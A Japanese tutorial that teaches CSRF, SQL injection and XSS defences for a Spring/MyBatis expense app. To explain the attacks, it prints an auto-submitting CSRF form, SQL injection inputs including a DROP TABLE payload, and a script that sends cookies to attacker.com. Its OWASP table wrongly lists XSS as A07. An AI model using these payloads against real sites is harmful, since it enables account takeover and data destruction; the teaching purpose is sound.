# セキュリティ深掘りガイド 🔐

## 📚 目次

1. [CSRF対策](#1-csrf対策)
2. [SQLインジェクション対策](#2-sqlインジェクション対策)
3. [XSS対策](#3-xss対策)
4. [認証・認可の実装](#4-認証認可の実装)
5. [パスワードハッシュ化](#5-パスワードハッシュ化)
6. [セキュリティのベストプラクティス](#6-セキュリティのベストプラクティス)
7. [次のステップ](#7-次のステップ)

---

## 1. CSRF対策

### CSRFとは？

**CSRF（Cross-Site Request Forgery）** = クロスサイトリクエストフォージェリ

攻撃者が被害者のブラウザを悪用して、意図しないリクエストを送信させる攻撃手法です。

### 攻撃シナリオ

```
1. 被害者が銀行サイトにログイン（セッションCookieが保存される）
   ↓
2. 攻撃者が罠サイトのリンクをメールで送信
   ↓
3. 被害者がリンクをクリック
   ↓
4. 罠サイトに埋め込まれた悪意のあるフォームが自動送信される
   ↓
5. 銀行サイトに「振込リクエスト」が送信される
   ↓
6. ブラウザは自動的にセッションCookieを送信
   ↓
7. 銀行サイトは正規のリクエストと判断して振込実行 ← 被害発生！
```

**罠サイトの例:**

```html
<!-- 攻撃者が用意した罠サイト -->
<html>
<body>
  <h1>おめでとうございます！プレゼントが当たりました！</h1>

  <!-- 非表示のフォームで自動送信 -->
  <form action="https://bank.example.com/transfer" method="POST" id="evil">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="1000000">
  </form>

  <script>
    // ページ読み込み時に自動送信
    document.getElementById('evil').submit();
  </script>
</body>
</html>
```

---

### CSRF対策の仕組み

Spring Securityでは **CSRFトークン** を使って対策します。

```
サーバー側でランダムなトークンを生成
   ↓
トークンをHTMLに埋め込む
   ↓
フォーム送信時にトークンを含める
   ↓
サーバー側でトークンを検証
   ↓
トークンが一致しない → リクエストを拒否（403 Forbidden）
```

---

### 実装例：detail.html

#### 1. HTMLのheadにトークンを埋め込む

**detail.html:5-6**

```html
<meta name="_csrf" th:content="${_csrf.token}"/>
<meta name="_csrf_header" th:content="${_csrf.headerName}"/>
```

**解説:**
- `${_csrf.token}` - Spring Securityが自動生成したCSRFトークン
- `${_csrf.headerName}` - トークンを送信するヘッダー名（通常は `X-CSRF-TOKEN`）

**レンダリング後:**

```html
<meta name="_csrf" content="a1b2c3d4-e5f6-7890-abcd-ef1234567890"/>
<meta name="_csrf_header" content="X-CSRF-TOKEN"/>
```

---

#### 2. JavaScriptでトークンを取得

**detail.html:229-231, 269-271**

```javascript
const headers = {};
const token = document.querySelector('meta[name="_csrf"]').content;
const header = document.querySelector('meta[name="_csrf_header"]').content;
headers[header] = token;  // headers['X-CSRF-TOKEN'] = 'a1b2c3d4...'
```

**解説:**
1. `document.querySelector('meta[name="_csrf"]').content` - metaタグからトークンを取得
2. `headers[header] = token` - ヘッダーオブジェクトに追加

---

#### 3. fetchでヘッダーに含めて送信

**detail.html:238-241**

```javascript
fetch(this.action, {
    method: 'POST',
    headers  // ← CSRFトークンを含むヘッダー
})
```

**実際のHTTPリクエスト:**

```http
POST /expenses/29/approve HTTP/1.1
Host: localhost:8080
X-CSRF-TOKEN: a1b2c3d4-e5f6-7890-abcd-ef1234567890
Cookie: JSESSIONID=ABC123...
```

---

### CSRFトークンの検証フロー

```
1. ユーザーがページにアクセス
   ↓
2. サーバーがCSRFトークンを生成してHTMLに埋め込む
   ↓
3. JavaScriptがトークンを取得
   ↓
4. ユーザーが「承認」ボタンをクリック
   ↓
5. fetchでPOSTリクエスト送信（ヘッダーにCSRFトークン含む）
   ↓
6. Spring Securityがトークンを検証
   ├── トークンが一致 → リクエストを処理（200 OK）
   └── トークンが不一致 → リクエストを拒否（403 Forbidden）
```

---

### なぜCSRF対策が必要か？

**CSRFトークンがない場合:**

```javascript
// 攻撃者のサイト
fetch('https://your-app.com/expenses/29/approve', {
    method: 'POST',
    credentials: 'include'  // Cookieを自動送信
});
// → ブラウザがCookieを送信するため、リクエストが成功してしまう！
```

**CSRFトークンがある場合:**

```javascript
// 攻撃者のサイト
fetch('https://your-app.com/expenses/29/approve', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'X-CSRF-TOKEN': '???'  // トークンが分からない！
    }
});
// → トークンが不一致のため、403 Forbiddenで拒否される
```

---

### FormのCSRF対策（Thymeleafの自動対応）

通常のHTMLフォームでは、Thymeleafが自動的にCSRFトークンを埋め込みます。

**detail.html:143-145**

```html
<form th:action="@{|/expenses/submit/${expense.id}|}" method="post">
    <button type="submit" class="btn btn-sm btn-outline-primary">提出</button>
</form>
```

**レンダリング後:**

```html
<form action="/expenses/submit/29" method="post">
    <!-- Thymeleafが自動的に隠しフィールドを追加 -->
    <input type="hidden" name="_csrf" value="a1b2c3d4-e5f6-7890-abcd-ef1234567890"/>
    <button type="submit" class="btn btn-sm btn-outline-primary">提出</button>
</form>
```

**サーバー側での検証:**

Spring Securityが自動的に `_csrf` パラメータを検証します。

---

### CSRFトークンの無効化（非推奨）

**SecurityConfig.java:46（コメント）**

```java
// .csrf(t -> t.disable())  // ← CSRF保護を無効化（本番環境では絶対NG！）
```

**無効化すると:**
- CSRFトークンなしでもPOSTリクエストを受け付ける
- CSRF攻撃に対して無防備になる
- **絶対に本番環境で無効化してはいけない**

**無効化が許されるケース:**
- APIサーバー（JWT認証など別の認証方式を使う場合）
- 開発・テスト環境のみ

---

## 2. SQLインジェクション対策

### SQLインジェクションとは？

攻撃者が入力フィールドに悪意のあるSQLを埋め込み、データベースを不正に操作する攻撃手法です。

### 攻撃シナリオ

**脆弱なコード例:**

```java
// ❌ 文字列結合でSQLを構築（SQLインジェクションの危険性）
String title = request.getParameter("title");  // ユーザー入力
String sql = "SELECT * FROM expenses WHERE title = '" + title + "'";
```

**攻撃例:**

```
ユーザー入力: ' OR '1'='1
                   ↓
実行されるSQL: SELECT * FROM expenses WHERE title = '' OR '1'='1'
                   ↓
全てのレコードが返される（データ漏洩）
```

**より悪質な例:**

```
ユーザー入力: '; DROP TABLE expenses; --
                   ↓
実行されるSQL: SELECT * FROM expenses WHERE title = ''; DROP TABLE expenses; --'
                   ↓
expenses テーブルが削除される！
```

---

### MyBatisのSQLインジェクション対策

MyBatisには2つの記法があります：

| 記法 | 説明 | 安全性 |
|------|------|--------|
| `#{}` | **プリペアドステートメント（推奨）** | ✅ 安全 |
| `${}` | **文字列置換** | ❌ 危険 |

---

### ✅ 安全な例：`#{}`

**ExpenseMapper.xml:42**

```xml
<if test="criteria.applicantId != null">
    AND applicant_id = #{criteria.applicantId}
</if>
```

**実行されるSQL:**

```sql
-- プリペアドステートメント（パラメータバインディング）
AND applicant_id = ?
```

**MyBatisが行う処理:**

```java
PreparedStatement ps = connection.prepareStatement(
    "SELECT * FROM expenses WHERE applicant_id = ?"
);
ps.setLong(1, criteria.getApplicantId());  // パラメータを安全にバインド
```

**なぜ安全か？**
- SQLとデータが分離される
- ユーザー入力がSQL構文として解釈されない
- `'`, `"`, `-`, `;` などの特殊文字が自動でエスケープされる

---

### ❌ 危険な例：`${}`

**ExpenseMapper.xml:63**

```xml
ORDER BY ${orderBy} ${direction}
```

**実行されるSQL:**

```sql
-- 文字列置換（直接埋め込み）
ORDER BY title DESC
```

**なぜ危険か？**

```
ユーザー入力: title; DROP TABLE expenses; --
                   ↓
実行されるSQL: ORDER BY title; DROP TABLE expenses; -- DESC
                   ↓
expenses テーブルが削除される！
```

---

### `${}` を使う正当な理由

**ExpenseMapper.xml:63** では、なぜ `${}` を使っているのか？

```xml
ORDER BY ${orderBy} ${direction}
```

**理由:**
- `ORDER BY` 句では、カラム名を動的に変更する必要がある
- `#{}` を使うとカラム名がクォートされてしまう

**`#{}` を使った場合（エラー）:**

```sql
-- ❌ カラム名がクォートされる
ORDER BY 'title' DESC

-- エラー: 'title' は文字列リテラルとして解釈される
```

**`${}` を使った場合（正しい）:**

```sql
-- ✅ カラム名として解釈される
ORDER BY title DESC
```

---

### `${}` を使う場合の安全対策

**ExpenseMapper.xml:152-168** では、`<choose>` で値を検証しています。

```xml
<choose>
    <when test="orderBy == 'title'">
        title
    </when>
    <when test="orderBy == 'submitted_at'">
        submitted_at
    </when>
    <when test="orderBy == 'updated_at'">
        updated_at
    </when>
    <otherwise>
        created_at
    </otherwise>
</choose>
<if test="direction == 'ASC' or direction == 'DESC'">
    ${direction}
</if>
```

**安全な理由:**
1. `orderBy` の値を `<choose>` でホワイトリスト検証
2. `direction` の値を `<if>` で `ASC` または `DESC` のみ許可
3. ユーザー入力が直接SQLに埋め込まれない

---

### 安全なコードと危険なコードの比較

| コード | 記法 | 安全性 | 理由 |
|--------|------|--------|------|
| `WHERE title = #{criteria.title}` | `#{}` | ✅ 安全 | パラメータバインディング |
| `WHERE title = '${criteria.title}'` | `${}` | ❌ 危険 | 文字列置換（SQLインジェクション） |
| `LIMIT #{size} OFFSET #{offset}` | `#{}` | ✅ 安全 | パラメータバインディング |
| `ORDER BY ${orderBy}` | `${}` | ⚠️ 条件付き安全 | ホワイトリスト検証が必要 |

---

### LIKE句のSQLインジェクション対策

**ExpenseMapper.xml:45**

```xml
<if test="criteria.title != null and criteria.title != '' ">
    AND title LIKE CONCAT('%', #{criteria.title}, '%')
</if>
```

**なぜ安全か？**

```
ユーザー入力: ' OR '1'='1
                   ↓
実行されるSQL: AND title LIKE CONCAT('%', ?, '%')
                   ↓
パラメータ: "' OR '1'='1"
                   ↓
検索される文字列: "%' OR '1'='1%"
                   ↓
SQLインジェクションにならない（単なる文字列として検索される）
```

---

## 3. XSS対策

### XSSとは？

**XSS（Cross-Site Scripting）** = クロスサイトスクリプティング

攻撃者が悪意のあるJavaScriptをWebページに埋め込み、他のユーザーのブラウザで実行させる攻撃手法です。

### 攻撃シナリオ

**脆弱なコード例:**

```html
<!-- ❌ ユーザー入力をそのまま出力 -->
<div>タイトル: ${expense.title}</div>
```

**攻撃例:**

```
ユーザーが経費タイトルに入力: <script>alert('XSS')</script>
                   ↓
HTMLに出力: <div>タイトル: <script>alert('XSS')</script></div>
                   ↓
ブラウザで実行される！
```

**より悪質な例:**

```html
<!-- Cookieを盗む -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

---

### Thymeleafの自動エスケープ

Thymeleafは **デフォルトでHTMLエスケープ** を行います。

**detail.html:127**

```html
<td class="" th:text="${expense.title}"></td>
```

**攻撃例:**

```
ユーザー入力: <script>alert('XSS')</script>
                   ↓
Thymeleafの処理: &lt;script&gt;alert('XSS')&lt;/script&gt;
                   ↓
ブラウザで表示: <script>alert('XSS')</script> （文字列として表示される）
```

**エスケープされる文字:**

| 文字 | エスケープ後 |
|------|-------------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#39;` |
| `&` | `&amp;` |

---

### エスケープを無効化する場合（危険）

```html
<!-- ❌ エスケープを無効化（XSSの危険性） -->
<div th:utext="${expense.title}"></div>
```

**`th:utext` を使うと:**
- HTMLエスケープされない
- ユーザー入力がそのまま出力される
- **絶対に信頼できないデータには使わない**

**許されるケース:**
- 管理者が作成したHTMLコンテンツ
- マークダウンをHTMLに変換した後（サニタイズ済み）

---

### 属性値のエスケープ

**detail.html:150**

```html
<form class="m-3 approve" th:action="@{|/expenses/approve/${expense.id}|(version=${expense.version})}"
     method="post" th:attr="data-expense-id=${expense.id}">
```

**Thymeleafの処理:**

```html
<!-- expense.id = 29 の場合 -->
<form class="m-3 approve" action="/expenses/approve/29?version=1"
     method="post" data-expense-id="29">
```

**もしユーザー入力に `"` が含まれていた場合:**

```
expense.id = 29" onclick="alert('XSS')
                   ↓
エスケープ後: 29&quot; onclick=&quot;alert('XSS')
                   ↓
<form data-expense-id="29&quot; onclick=&quot;alert('XSS')">
                   ↓
XSSにならない！
```

---

### JavaScriptでのエスケープ

**detail.html:224**

```javascript
const expenseId = this.dataset.expenseId;
```

**DOM APIを使う場合:**
- `textContent` - 安全（HTMLエスケープされる）
- `innerHTML` - 危険（HTMLとして解釈される）

**安全な例:**

```javascript
// ✅ 安全
element.textContent = userInput;  // HTMLエスケープされる
```

**危険な例:**

```javascript
// ❌ 危険
element.innerHTML = userInput;  // XSSの危険性
```

---

## 4. 認証・認可の実装

### Spring Securityの基本

**SecurityConfig.java** で認証・認可を設定します。

```java
@Configuration
public class SecurityConfig {

    @Bean
    SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http.authorizeHttpRequests(auth -> auth
            .requestMatchers(HttpMethod.POST, "/expenses/*/approve", "/expenses/*/reject")
            .hasRole("APPROVER")  // ROLE_APPROVER が必要
            .requestMatchers("/login", "/register/**").permitAll()  // 誰でもアクセス可
            .anyRequest().authenticated()  // その他は認証が必要
        )
        .formLogin(...)
        .logout(...)
        .httpBasic(Customizer.withDefaults());

        return http.build();
    }
}
```

---

### 認証 vs 認可

| 用語 | 意味 | 例 |
|------|------|-----|
| **認証（Authentication）** | 「あなたは誰？」を確認 | ログイン（ユーザー名・パスワード） |
| **認可（Authorization）** | 「あなたは何ができる？」を確認 | 管理者のみがユーザー削除可能 |

---

### 認可の設定

**SecurityConfig.java:22-24**

```java
.requestMatchers(HttpMethod.POST, "/expenses/*/approve", "/expenses/*/reject")
.hasRole("APPROVER")
```

**解説:**
- `/expenses/*/approve` - 経費の承認
- `/expenses/*/reject` - 経費の却下
- `.hasRole("APPROVER")` - `ROLE_APPROVER` ロールが必要

**動作:**

```
1. ユーザーが /expenses/29/approve にPOSTリクエスト
   ↓
2. Spring Securityがロールをチェック
   ├── ROLE_APPROVER がある → リクエストを処理
   └── ROLE_APPROVER がない → 403 Forbiddenで拒否
```

---

### ロールの取得

**UserMapper.xml:9-15**

```xml
<select id="findByEmail" resultType="com.example.expenses.domain.User" resultMap="userMap">
    SELECT u.id, u.email, u.password, r.id as role_id, r.user_id, r.role
    FROM users u
    LEFT JOIN roles r ON u.id = r.user_id
    WHERE u.email = #{email}
</select>

<resultMap type="com.example.expenses.domain.User" id="userMap">
    <id property="id" column="id"/>
    <result property="email" column="email"/>
    <result property="password" column="password"/>

    <collection property="roles" javaType="java.util.List" ofType="com.example.expenses.domain.Role">
        <id property="id" column="role_id"/>
        <result property="userId" column="user_id"/>
        <result property="role" column="role"/>
        <result property="createdAt" column="created_at"/>
        <result property="updatedAt" column="updated_at"/>
    </collection>
</resultMap>
```

**動作:**

```
1. ログイン時に findByEmail でユーザー情報を取得
   ↓
2. LEFT JOIN で roles テーブルと結合
   ↓
3. <collection> で User オブジェクトに Role のリストをマッピング
   ↓
4. Spring Security が roles を使って認可判定
```

---

### permitAll vs authenticated

**SecurityConfig.java:25-34**

```java
.requestMatchers(
    "/static/**",
    "/login",
    "/health",
    "/swagger-ui",
    "/v3/api-docs/**",
    "/register/**",
    "/expenses/**"
).permitAll()  // 誰でもアクセス可
.anyRequest().authenticated()  // その他は認証が必要
```

**解説:**

| パス | アクセス制御 |
|------|-------------|
| `/login` | 誰でもアクセス可（ログインページ） |
| `/register/**` | 誰でもアクセス可（ユーザー登録） |
| `/static/**` | 誰でもアクセス可（CSS、JSなどの静的ファイル） |
| `/expenses/**` | 誰でもアクセス可 |
| その他 | 認証が必要 |

---

### formLogin vs httpBasic

**SecurityConfig.java:36-40, 47**

```java
.formLogin(
    f -> f
    .loginPage("/login")
    .loginProcessingUrl("/login")
    .successHandler(successHandler)
)
.httpBasic(Customizer.withDefaults())
```

**解説:**

| 方式 | 用途 | 特徴 |
|------|------|------|
| **formLogin** | Webブラウザ | HTMLのログインフォーム |
| **httpBasic** | API、テスト | HTTP Basic認証（ヘッダーにユーザー名・パスワード） |

**HTTP Basic認証の例:**

```http
GET /expenses HTTP/1.1
Host: localhost:8080
Authorization: Basic aGlrYXJ1QGV4YW1wbGUuY29tOnBhc3MxMjM0
```

**Base64デコード:**

```
aGlrYXJ1QGV4YW1wbGUuY29tOnBhc3MxMjM0
  ↓ Base64デコード
hikaru@example.com:pass1234
```

---

## 5. パスワードハッシュ化

### なぜハッシュ化が必要か？

**❌ パスワードを平文で保存する場合:**

```
users テーブル:
+----+----------------------+----------+
| id | email                | password |
+----+----------------------+----------+
| 1  | hikaru@example.com   | pass1234 |
| 2  | approver@example.com | 1234     |
+----+----------------------+----------+
```

**問題点:**
1. DBが漏洩したら全パスワードが露出
2. 管理者がパスワードを見れる
3. 攻撃者が簡単にログイン可能

---

### ✅ BCryptでハッシュ化

**SecurityConfig.java:52-55**

```java
@Bean
PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
}
```

**ハッシュ化後のパスワード:**

```
users テーブル:
+----+----------------------+--------------------------------------------------------------+
| id | email                | password                                                     |
+----+----------------------+--------------------------------------------------------------+
| 1  | hikaru@example.com   | $2a$10$N9qo8uLOickgx2ZMRZoMye7iYg8YGOqP4XYD/1K3Zvp.M6XG2YC8u |
| 2  | approver@example.com | $2a$10$8K1p/aTCAZZYHhKdJKz8h.f7m9kFGmZvJ7Y8qL3P9Q5kXy9zJ8pWu |
+----+----------------------+--------------------------------------------------------------+
```

**ハッシュの構造:**

```
$2a$10$N9qo8uLOickgx2ZMRZoMye7iYg8YGOqP4XYD/1K3Zvp.M6XG2YC8u
 |   |  |                              |
 |   |  |                              +-- ハッシュ値
 |   |  +-- ソルト（ランダム値）
 |   +-- コスト（計算回数: 2^10 = 1024回）
 +-- アルゴリズム（BCrypt）
```

---

### BCryptの特徴

#### 1. ソルト（Salt）の自動生成

**ソルトとは？**
- ランダムな文字列を追加してハッシュ化
- 同じパスワードでも異なるハッシュ値になる

**例:**

```
ユーザーA: pass1234 → $2a$10$N9qo8uLOickgx2ZMRZoMye7iYg8YGOqP4XYD/1K3Zvp.M6XG2YC8u
ユーザーB: pass1234 → $2a$10$8K1p/aTCAZZYHhKdJKz8h.f7m9kFGmZvJ7Y8qL3P9Q5kXy9zJ8pWu
                       ↑ 同じパスワードでも異なるハッシュ！
```

**なぜ必要か？**
- レインボーテーブル攻撃を防ぐ
- 同じパスワードを使っているユーザーを特定できない

---

#### 2. 不可逆性

```
パスワード → ハッシュ化 → ハッシュ値
   ↓                       ↑
   ✅ 可能               ❌ 不可能（復号できない）
```

**ログイン時の検証:**

```java
// ログイン時
String inputPassword = "pass1234";  // ユーザーが入力
String storedHash = "$2a$10$N9qo8uLOickgx2ZMRZoMye7iYg8YGOqP4XYD/1K3Zvp.M6XG2YC8u";  // DBから取得

// BCryptで検証
boolean matches = passwordEncoder.matches(inputPassword, storedHash);
// → true （パスワードが一致）
```

**内部処理:**

```
1. storedHash からソルトを抽出
   ↓
2. inputPassword + ソルト でハッシュ化
   ↓
3. 計算したハッシュと storedHash を比較
   ├── 一致 → true
   └── 不一致 → false
```

---

#### 3. 遅い計算（ブルートフォース攻撃対策）

**コスト（計算回数）:**

```
$2a$10$...
     ↑
     コスト = 10 → 2^10 = 1024回
```

**なぜ遅くする？**

| パスワード検証 | 1回 | 100万回 |
|---------------|-----|---------|
| **MD5（高速）** | 0.0001秒 | 100秒 |
| **BCrypt（遅い）** | 0.1秒 | 27時間 |

**効果:**
- 正規のログイン: 0.1秒の遅延は問題なし
- ブルートフォース攻撃: 100万回試すのに27時間かかる → 攻撃が困難

---

## 6. セキュリティのベストプラクティス

### ✅ やるべきこと

#### 1. CSRF対策を有効にする

```java
// ✅ 良い例（デフォルト）
http.csrf(Customizer.withDefaults());

// ❌ 悪い例（無効化）
http.csrf(t -> t.disable());  // 本番環境では絶対NG！
```

---

#### 2. SQLインジェクション対策

```xml
<!-- ✅ 良い例: #{} を使う -->
WHERE title = #{criteria.title}

<!-- ❌ 悪い例: ${} を使う -->
WHERE title = '${criteria.title}'
```

---

#### 3. XSS対策

```html
<!-- ✅ 良い例: th:text を使う -->
<div th:text="${expense.title}"></div>

<!-- ❌ 悪い例: th:utext を使う -->
<div th:utext="${expense.title}"></div>
```

---

#### 4. パスワードハッシュ化

```java
// ✅ 良い例: BCrypt
@Bean
PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
}

// ❌ 悪い例: 平文
String password = "pass1234";  // DBに平文で保存
```

---

#### 5. HTTPSを使う

```
本番環境では必ずHTTPSを使う
  ↓
パスワードやトークンが暗号化される
  ↓
中間者攻撃（Man-in-the-Middle）を防ぐ
```

---

#### 6. セッション管理

```java
// セッション固定攻撃対策
http.sessionManagement(session -> session
    .sessionFixation().migrateSession()  // ログイン時にセッションIDを変更
    .maximumSessions(1)  // 同時ログイン数を制限
    .maxSessionsPreventsLogin(true)  // 新しいログインを拒否
);
```

---

#### 7. セキュリティヘッダー

```java
// Spring Securityがデフォルトで設定するヘッダー
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'"))  // CSP
    .frameOptions().deny()  // クリックジャッキング対策
    .xssProtection()  // XSS対策
    .contentTypeOptions()  // MIME sniffing対策
);
```

---

### ❌ やってはいけないこと

#### 1. CSRF保護を無効化

```java
// ❌ 絶対NG！
http.csrf(t -> t.disable());
```

---

#### 2. パスワードを平文で保存

```java
// ❌ 絶対NG！
user.setPassword("pass1234");  // 平文
```

---

#### 3. SQLを文字列結合

```java
// ❌ 絶対NG！
String sql = "SELECT * FROM users WHERE email = '" + email + "'";
```

---

#### 4. ユーザー入力をHTMLに直接出力

```html
<!-- ❌ 絶対NG！ -->
<div th:utext="${userInput}"></div>
```

---

#### 5. エラーメッセージに詳細情報を含める

```java
// ❌ 悪い例
catch (SQLException e) {
    return "Database error: " + e.getMessage();  // SQLの構造が漏洩
}

// ✅ 良い例
catch (SQLException e) {
    log.error("Database error", e);  // ログに記録
    return "システムエラーが発生しました";  // 抽象的なメッセージ
}
```

---

## 7. 次のステップ

### 🎯 学習課題

#### 課題1: CSRF攻撃を試す

1. CSRF保護を一時的に無効化
2. 外部サイトから経費承認リクエストを送信
3. 攻撃が成功することを確認
4. CSRF保護を有効化して攻撃を防ぐ

---

#### 課題2: SQLインジェクションを試す

1. `#{}` を `${}` に変更
2. タイトル検索に `' OR '1'='1` を入力
3. 全レコードが返されることを確認
4. `#{}` に戻して攻撃を防ぐ

---

#### 課題3: XSSを試す

1. `th:text` を `th:utext` に変更
2. タイトルに `<script>alert('XSS')</script>` を入力
3. アラートが表示されることを確認
4. `th:text` に戻して攻撃を防ぐ

---

#### 課題4: セキュリティヘッダーを確認

ブラウザの開発者ツールで以下のヘッダーを確認：

```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
```

---

### 📚 参考資料

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Spring Security公式ドキュメント](https://spring.io/projects/spring-security)
- [MyBatis公式ドキュメント](https://mybatis.org/mybatis-3/)
- [BCrypt Wikipedia](https://en.wikipedia.org/wiki/Bcrypt)

---

## 📝 まとめ

### セキュリティ対策チェックリスト

| 対策 | 実装方法 | ファイル |
|------|---------|---------|
| ✅ **CSRF対策** | CSRFトークン（Spring Security） | detail.html, SecurityConfig.java |
| ✅ **SQLインジェクション対策** | `#{}` を使う（MyBatis） | ExpenseMapper.xml |
| ✅ **XSS対策** | `th:text` を使う（Thymeleaf） | detail.html |
| ✅ **認証・認可** | Spring Security | SecurityConfig.java |
| ✅ **パスワードハッシュ化** | BCrypt | SecurityConfig.java |

### OWASP Top 10 (2021) との対応

| 脆弱性 | 対策 |
|--------|------|
| **A01: Broken Access Control** | Spring Securityの `.hasRole()` |
| **A02: Cryptographic Failures** | BCryptでパスワードハッシュ化 |
| **A03: Injection** | MyBatisの `#{}` |
| **A04: Insecure Design** | CSRF対策、セキュリティヘッダー |
| **A07: XSS** | Thymeleafの自動エスケープ |

---

🎉 **おめでとうございます！セキュリティの基礎を学びました。**

次は実際に攻撃を試して、対策の重要性を体感しましょう！
